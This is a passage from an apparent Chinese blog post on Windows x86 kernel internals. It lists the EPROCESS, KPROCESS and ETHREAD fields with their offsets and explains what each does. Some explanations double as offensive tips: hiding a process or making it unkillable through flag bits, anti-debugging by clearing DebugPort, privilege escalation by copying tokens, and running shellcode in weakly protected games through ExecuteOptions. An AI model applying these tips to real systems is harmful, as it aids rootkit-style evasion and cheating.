class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG ReportPhysicalPageChanges:<span class=\"number\">1</span>;                              <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG HandleTableRundown:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG NeedsHandleRundown:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG RefTraceEnabled:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG NumaAware:<span class=\"number\">1</span>;                                              <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG ProtectedProcess:<span class=\"number\">1</span>;                                       <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG DefaultPagePriority:<span class=\"number\">3</span>;                                    <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG PrimaryTokenFrozen:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG ProcessVerifierTarget:<span class=\"number\">1</span>;                                  <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG StackRandomizationDisabled:<span class=\"number\">1</span>;                             <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG AffinityPermanent:<span class=\"number\">1</span>;                                      <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG AffinityUpdateEnable:<span class=\"number\">1</span>;                                   <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG PropagateNode:<span class=\"number\">1</span>;                                          <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG ExplicitAffinity:<span class=\"number\">1</span>;                                       <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG Flags;                                                        <span class=\"comment\">//0x270</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG CreateReported:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG NoDebugInherit:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG ProcessExiting:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG ProcessDelete:<span class=\"number\">1</span>;                                          <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG Wow64SplitPages:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG VmDeleted:<span class=\"number\">1</span>;                                              <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG OutswapEnabled:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG Outswapped:<span class=\"number\">1</span>;                                             <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG ForkFailed:<span class=\"number\">1</span>;                                             <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG Wow64VaSpace4Gb:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG AddressSpaceInitialized:<span class=\"number\">2</span>;                                <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG SetTimerResolution:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG BreakOnTermination:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG DeprioritizeViews:<span class=\"number\">1</span>;                                      <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG WriteWatch:<span class=\"number\">1</span>;                                             <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG ProcessInSession:<span class=\"number\">1</span>;                                       <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG OverrideAddressSpace:<span class=\"number\">1</span>;                                   <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG HasAddressSpace:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG LaunchPrefetched:<span class=\"number\">1</span>;                                       <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG InjectInpageErrors:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG VmTopDown:<span class=\"number\">1</span>;                                              <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG ImageNotifyDone:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG PdeUpdateNeeded:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG VdmAllowed:<span class=\"number\">1</span>;                                             <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG CrossSessionCreate:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG ProcessInserted:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG DefaultIoPriority:<span class=\"number\">3</span>;                                      <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG ProcessSelfDelete:<span class=\"number\">1</span>;                                      <span class=\"comment\">//0x270</span></span><br><span class=\"line\">            ULONG SetTimerResolutionLink:<span class=\"number\">1</span>;                                 <span class=\"comment\">//0x270</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    LONG ExitStatus;                                                        <span class=\"comment\">//0x274</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_MM_AVL_TABLE</span> VadRoot;                                           <span class=\"comment\">//0x278</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_ALPC_PROCESS_CONTEXT</span> AlpcContext;                               <span class=\"comment\">//0x298</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> TimerResolutionLink;                                 <span class=\"comment\">//0x2a8</span></span><br><span class=\"line\">    ULONG RequestedTimerResolution;                                         <span class=\"comment\">//0x2b0</span></span><br><span class=\"line\">    ULONG ActiveThreadsHighWatermark;                                       <span class=\"comment\">//0x2b4</span></span><br><span class=\"line\">    ULONG SmallestTimerResolution;                                          <span class=\"comment\">//0x2b8</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_PO_DIAG_STACK_RECORD</span>* TimerResolutionStackRecord;               <span class=\"comment\">//0x2bc</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>Pcb：Kprocess结构体。内核成员，见下文。</p>\n</li>\n<li><p>ProcessLock：R3进程锁。修改EPROCESS结构存放锁结构，防止同时修改。改完了置0.</p>\n</li>\n<li><p>CreateTime：进程的创建时间。</p>\n</li>\n<li><p>ExitTime：进程的退出时间。</p>\n</li>\n<li><p>RundownProtect：进程锁。该字段置值后，进程无法被访问、打开、结束，相当于保护。但是会容易卡死。</p>\n</li>\n</ul>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613124753624.png\" alt=\"image-20230613124753624\"></p>\n<ul>\n<li><p>UniqueProcessId：进程ID。任务管理器中显示的进程ID就是这个。</p>\n</li>\n<li><p>ActiveProcessLinks：双向链表。包括了windows中所有活动的进程。全局变量“PsActiveProcessHead”指向了这个链表的头部。通过该全局变量可以遍历整条链表。<br><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613160050089.png\" alt=\"image-20230613160050089\"></p>\n</li>\n<li><p>ProcessQuotaUsage：进程物理页相关统计信息。</p>\n</li>\n<li><p>ProcessQuotaPeak：进程物理页相关统计信息。</p>\n</li>\n<li><p>CommitCharge：进程虚拟内存相关统计信息。</p>\n</li>\n<li><p>QuotaBlock：进程虚拟内存相关统计信息。</p>\n</li>\n<li><p>CpuQuotaBlock：进程虚拟内存相关统计信息。</p>\n</li>\n<li><p>SessionProcessLinks：会话进程链表。保存了当前登录的用户的所有进程。</p>\n</li>\n<li><p>DebugPort：调试相关。如果该进程处于调试状态，这里会有值（一个结构体），该结构体用于进程与调试器之间通信。通过循环清0可以达到反调试效果。</p>\n</li>\n<li><p>ExceptionPortData：调试相关。</p>\n</li>\n<li><p>ObjectTable：进程的句柄表。句柄相关章节再学。</p>\n</li>\n<li><p>Token：进程Token，外边的提权实际上就是拷贝这个位置的Token。<code>System/Administror</code></p>\n</li>\n<li><p>WorkingSetPage：表明当前进程用了多少个物理页。</p>\n</li>\n<li><p>ImageFileName：当前进程的进程名，但是只有15个字节，要获取完整的可以获取<code>SeAuditProcessCreationInfo</code>。</p>\n</li>\n<li><p>ThreadListHead：当前进程内所有线程的链表。</p>\n</li>\n<li><p>ActiveThreads：当前进程内活动的线程数量。</p>\n</li>\n<li><p>Peb。就是3环下该进程的PEB。（PEB结构此处不赘述了，网上有非常多的PEB结构说明。）</p>\n</li>\n<li><p>SeAuditProcessCreationInfo：当前进程完整路径。函数<code>SeLocateProcessImageName</code>就是获取的这个位置。</p>\n</li>\n<li><p>Flags2：一个联合体，每个位影响该进程的一些属性。</p>\n<ul>\n<li>ProtectedProcess：进程保护位。该位置1后该进程被保护。CE看不到图片，打不开了进程。OD附加进程列表遍历不到。一个最简单的进程保护。</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613125912245.png\" alt=\"image-20230613125912245\"></p>\n<ul>\n<li><p>+Flags：一个联合体，每个位影响该进程的一些属性。</p>\n<ul>\n<li><p>ProcessExiting：进程退出标志位。置1后表明该进程已退出，但实际还在运行。可以达到反调试的效果。同时进程无法使用任务管理器结束。</p>\n</li>\n<li><p>ProcessDelete：进程退出标志位。置1后表明该进程已退出，但实际还在运行。可以达到反调试的效果。同时进程无法使用任务管理器结束。<br><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613130000778.png\" alt=\"image-20230613130000778\"></p>\n</li>\n<li><p>BreakOnTermination：该位置1后，任务管理器结束进程时将提示“是否结束系统进程XXX”。结束后windbg将会断下。<br><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613130019847.png\" alt=\"image-20230613130019847\"></p>\n</li>\n<li><p>VmTopDown：该位置1时，VirtualAlloc一类的申请内存函数将会从大地址开始申请。</p>\n</li>\n<li><p>ProcessInserted：该位置0后，OD附加进程列表找不到该进程。任务管理器结束不掉该进程。CE打不开该进程，无图标。</p>\n</li>\n</ul>\n</li>\n<li><p>ExitStatus：进程退出状态码。进程创建时默认值是250（0x103）。如果不是这个值基本上就是进程退出了。</p>\n</li>\n<li><p>VadRoot：标识当前进程用户空间（低2G）中哪些地址没被分配。该成员指向了一个二叉树。</p>\n</li>\n</ul>\n<h2 id=\"2-1-KPROCESS\"><a href=\"#2-1-KPROCESS\" class=\"headerlink\" title=\"2.1 KPROCESS\"></a>2.1 KPROCESS</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x98 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_KPROCESS</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_DISPATCHER_HEADER</span> Header;                                       <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ProfileListHead;                                     <span class=\"comment\">//0x10</span></span><br><span class=\"line\">    ULONG DirectoryTableBase;                                               <span class=\"comment\">//0x18</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KGDTENTRY</span> LdtDescriptor;                                        <span class=\"comment\">//0x1c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KIDTENTRY</span> Int21Descriptor;                                      <span class=\"comment\">//0x24</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ThreadListHead;                                      <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    ULONG ProcessLock;                                                      <span class=\"comment\">//0x34</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KAFFINITY_EX</span> Affinity;                                          <span class=\"comment\">//0x38</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ReadyListHead;                                       <span class=\"comment\">//0x44</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_SINGLE_LIST_ENTRY</span> SwapListEntry;                                <span class=\"comment\">//0x4c</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_KAFFINITY_EX</span> ActiveProcessors;                         <span class=\"comment\">//0x50</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> LONG AutoAlignment:<span class=\"number\">1</span>;                                  <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> LONG DisableBoost:<span class=\"number\">1</span>;                                   <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> LONG DisableQuantum:<span class=\"number\">1</span>;                                 <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG ActiveGroupsMask:<span class=\"number\">1</span>;                              <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> LONG ReservedFlags:<span class=\"number\">28</span>;                                 <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">volatile</span> LONG ProcessFlags;                                         <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    CHAR BasePriority;                                                      <span class=\"comment\">//0x60</span></span><br><span class=\"line\">    CHAR QuantumReset;                                                      <span class=\"comment\">//0x61</span></span><br><span class=\"line\">    UCHAR Visited;                                                          <span class=\"comment\">//0x62</span></span><br><span class=\"line\">    UCHAR Unused3;                                                          <span class=\"comment\">//0x63</span></span><br><span class=\"line\">    ULONG ThreadSeed[<span class=\"number\">1</span>];                                                    <span class=\"comment\">//0x64</span></span><br><span class=\"line\">    USHORT IdealNode[<span class=\"number\">1</span>];                                                    <span class=\"comment\">//0x68</span></span><br><span class=\"line\">    USHORT IdealGlobalNode;                                                 <span class=\"comment\">//0x6a</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_KEXECUTE_OPTIONS</span> Flags;                                          <span class=\"comment\">//0x6c</span></span><br><span class=\"line\">    UCHAR Unused1;                                                          <span class=\"comment\">//0x6d</span></span><br><span class=\"line\">    USHORT IopmOffset;                                                      <span class=\"comment\">//0x6e</span></span><br><span class=\"line\">    ULONG Unused4;                                                          <span class=\"comment\">//0x70</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_KSTACK_COUNT</span> StackCount;                                         <span class=\"comment\">//0x74</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ProcessListEntry;                                    <span class=\"comment\">//0x78</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONGLONG CycleTime;                                           <span class=\"comment\">//0x80</span></span><br><span class=\"line\">    ULONG KernelTime;                                                       <span class=\"comment\">//0x88</span></span><br><span class=\"line\">    ULONG UserTime;                                                         <span class=\"comment\">//0x8c</span></span><br><span class=\"line\">    VOID* VdmTrapcHandler;                                                  <span class=\"comment\">//0x90</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>Header：可等待对象头部。所有0环结构体只要以_DISPATCHER_HEADER结构开头的，都可以使用WaitForSingleObject等待。如互斥体、事件。</p>\n</li>\n<li><p>ProfileListHead：性能分析相关，任务管理器，性能栏那些数据。</p>\n</li>\n<li><p>DirectoryTableBase：页目录表基址。物理地址，指向页目录表，CR3中的值就从这里获取。</p>\n</li>\n<li><p>LdtDescriptor：进程LDT描述符。</p>\n</li>\n<li><p>Int21Descriptor：为了兼容DOS下可通过Int21调用系统功能。</p>\n</li>\n<li><p>ThreadListHead：当前进程的所有线程结构体链表。这个位置- KTHREAD-&gt;ThreadListHead &#x3D;&#x3D; KTHREAD</p>\n</li>\n<li><p>ProcessLock：进程锁，作用和EPROCESS中的一样，但这个是RO用的。</p>\n</li>\n<li><p>Affinity：亲核性。规定了当前进程内的所有线程可以在哪些CPU上跑，4字节，共32位，每一位对应一个CPU核。如000000A1，转换为二进制为1010 0001，则该进程中的线程只能在0、5、7号CPU上运行。因此32位系统最多支持32核CPU，64位系统支持64核CPU。该值仅为线程结构中的亲核性做初始化赋值使用，没有实际的限制功能。</p>\n<p>如果只有1个CPU，但此处值为2（0010），则该进程为一个“死”了的进程。</p>\n</li>\n<li><p>ReadyListHead：当前进程内的就绪线程链表，保存的值指向了<code>ETHREAD-&gt;WaitListEntry</code>地址。当进程被换出内存以后，所属的线程一旦就绪就会加入到这个链表中，然后换入进程，并将就绪线程链表全部加入全局的就绪线程链表。</p>\n</li>\n<li><p>SwapListEntry：当进程被换出内存时会通过这个位置将进程加入到<code>KiProcessOutSwapListHead</code>，换入时加入到<code>KiProcessInSwapListHead</code>。</p>\n</li>\n<li><p>ActiveProcessors：当前进程内正在运行的线程运行在哪些CPU上。</p>\n</li>\n<li><p>AutoAlignment：强制内存对齐。一般为0。</p>\n</li>\n<li><p>DisableBoost：置1为关闭当前进程内所有线程的时间碎片。（置1后，不会由于时间中断触发线程切换）</p>\n</li>\n<li><p>BasePriority：基础优先级。该进程内所有线程最初的优先级。</p>\n</li>\n<li><p>QuantumReset：当前进程内线程的初始时间碎片。每一次时钟中断会将线程中的时间碎片减6，为0时，切换线程。线程从就绪变为运行时，会从这个值中取到初始的时间碎片。改大这个值会让该进程内的线程跑的更久。</p>\n</li>\n<li><p>ProcessListEntry：系统内所有进程的链表。win7及以上此处为空，已弃用。</p>\n</li>\n<li><p>Flags：进程NX位的局部开关。结构为_KEXECUTE_OPTIONS的联合体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x1 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">union</span> _<span class=\"title\">KEXECUTE_OPTIONS</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    UCHAR ExecuteDisable:<span class=\"number\">1</span>;                                                 <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR ExecuteEnable:<span class=\"number\">1</span>;                                                  <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR DisableThunkEmulation:<span class=\"number\">1</span>;                                          <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR Permanent:<span class=\"number\">1</span>;                                                      <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR ExecuteDispatchEnable:<span class=\"number\">1</span>;                                          <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR ImageDispatchEnable:<span class=\"number\">1</span>;                                            <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR DisableExceptionChainValidation:<span class=\"number\">1</span>;                                <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    UCHAR Spare:<span class=\"number\">1</span>;                                                          <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> UCHAR ExecuteOptions;                                          <span class=\"comment\">//0x0</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>ExecuteOptions：写1，数据段可以当做代码执行。写0数据段不能当做代码执行。<code>某些检测弱的游戏可以通过对这个置1，然后申请一段可读可写内存作为shellcode执行</code>。</li>\n</ul>\n</li>\n<li><p>CycleTime：当前进程执行了多少个指令周期。当进程结束时才会被赋值，指明了该进程存活了多久。</p>\n</li>\n<li><p>KernelTime：（统计信息）当前进程在0环的运行时间。<code>当进程结束时才会被赋值，指明了该进程存活了多久。</code></p>\n</li>\n<li><p>UserTime：（统计信息）当前进程在3环的运行时间。<code>当进程结束时才会被赋值，指明了该进程存活了多久。</code></p>\n</li>\n<li><p>VdmTrapcHandler：虚拟8086模式时使用。</p>\n</li>\n</ul>\n<h1 id=\"2、ETHREAD\"><a href=\"#2、ETHREAD\" class=\"headerlink\" title=\"2、ETHREAD\"></a>2、ETHREAD</h1><p>与EPROCESS类似，主要用来描述线程。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x2b8 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_ETHREAD</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTHREAD</span> Tcb;                                                    <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> CreateTime;                                        <span class=\"comment\">//0x200</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> ExitTime;                                      <span class=\"comment\">//0x208</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> KeyedWaitChain;                                  <span class=\"comment\">//0x208</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    LONG ExitStatus;                                                        <span class=\"comment\">//0x210</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> PostBlockList;                                   <span class=\"comment\">//0x214</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            VOID* ForwardLinkShadow;                                        <span class=\"comment\">//0x214</span></span><br><span class=\"line\">            VOID* StartAddress;                                             <span class=\"comment\">//0x218</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_TERMINATION_PORT</span>* TerminationPort;                          <span class=\"comment\">//0x21c</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_ETHREAD</span>* ReaperLink;                                        <span class=\"comment\">//0x21c</span></span><br><span class=\"line\">        VOID* KeyedWaitValue;                                               <span class=\"comment\">//0x21c</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    ULONG ActiveTimerListLock;                                              <span class=\"comment\">//0x220</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ActiveTimerListHead;                                 <span class=\"comment\">//0x224</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_CLIENT_ID</span> Cid;                                                  <span class=\"comment\">//0x22c</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_KSEMAPHORE</span> KeyedWaitSemaphore;                              <span class=\"comment\">//0x234</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_KSEMAPHORE</span> AlpcWaitSemaphore;                               <span class=\"comment\">//0x234</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_PS_CLIENT_SECURITY_CONTEXT</span> ClientSecurity;                       <span class=\"comment\">//0x248</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> IrpList;                                             <span class=\"comment\">//0x24c</span></span><br><span class=\"line\">    ULONG TopLevelIrp;                                                      <span class=\"comment\">//0x254</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_DEVICE_OBJECT</span>* DeviceToVerify;                                  <span class=\"comment\">//0x258</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_PSP_CPU_QUOTA_APC</span>* CpuQuotaApc;                                  <span class=\"comment\">//0x25c</span></span><br><span class=\"line\">    VOID* Win32StartAddress;                                                <span class=\"comment\">//0x260</span></span><br><span class=\"line\">    VOID* LegacyPowerObject;                                                <span class=\"comment\">//0x264</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ThreadListEntry;                                     <span class=\"comment\">//0x268</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_RUNDOWN_REF</span> RundownProtect;                                  <span class=\"comment\">//0x270</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_PUSH_LOCK</span> ThreadLock;                                        <span class=\"comment\">//0x274</span></span><br><span class=\"line\">    ULONG ReadClusterSize;                                                  <span class=\"comment\">//0x278</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmLockOrdering;                                           <span class=\"comment\">//0x27c</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG CrossThreadFlags;                                             <span class=\"comment\">//0x280</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG Terminated:<span class=\"number\">1</span>;                                             <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG ThreadInserted:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG HideFromDebugger:<span class=\"number\">1</span>;                                       <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG ActiveImpersonationInfo:<span class=\"number\">1</span>;                                <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG Reserved:<span class=\"number\">1</span>;                                               <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG HardErrorsAreDisabled:<span class=\"number\">1</span>;                                  <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG BreakOnTermination:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG SkipCreationMsg:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG SkipTerminationMsg:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG CopyTokenOnOpen:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG ThreadIoPriority:<span class=\"number\">3</span>;                                       <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG ThreadPagePriority:<span class=\"number\">3</span>;                                     <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG RundownFail:<span class=\"number\">1</span>;                                            <span class=\"comment\">//0x280</span></span><br><span class=\"line\">            ULONG NeedsWorkingSetAging:<span class=\"number\">1</span>;                                   <span class=\"comment\">//0x280</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG SameThreadPassiveFlags;                                       <span class=\"comment\">//0x284</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG ActiveExWorker:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x284</span></span><br><span class=\"line\">            ULONG ExWorkerCanWaitUser:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x284</span></span><br><span class=\"line\">            ULONG MemoryMaker:<span class=\"number\">1</span>;                                            <span class=\"comment\">//0x284</span></span><br><span class=\"line\">            ULONG ClonedThread:<span class=\"number\">1</span>;                                           <span class=\"comment\">//0x284</span></span><br><span class=\"line\">            ULONG KeyedEventInUse:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x284</span></span><br><span class=\"line\">            ULONG RateApcState:<span class=\"number\">2</span>;                                           <span class=\"comment\">//0x284</span></span><br><span class=\"line\">            ULONG SelfTerminate:<span class=\"number\">1</span>;                                          <span class=\"comment\">//0x284</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG SameThreadApcFlags;                                           <span class=\"comment\">//0x288</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR Spare:<span class=\"number\">1</span>;                                                  <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> 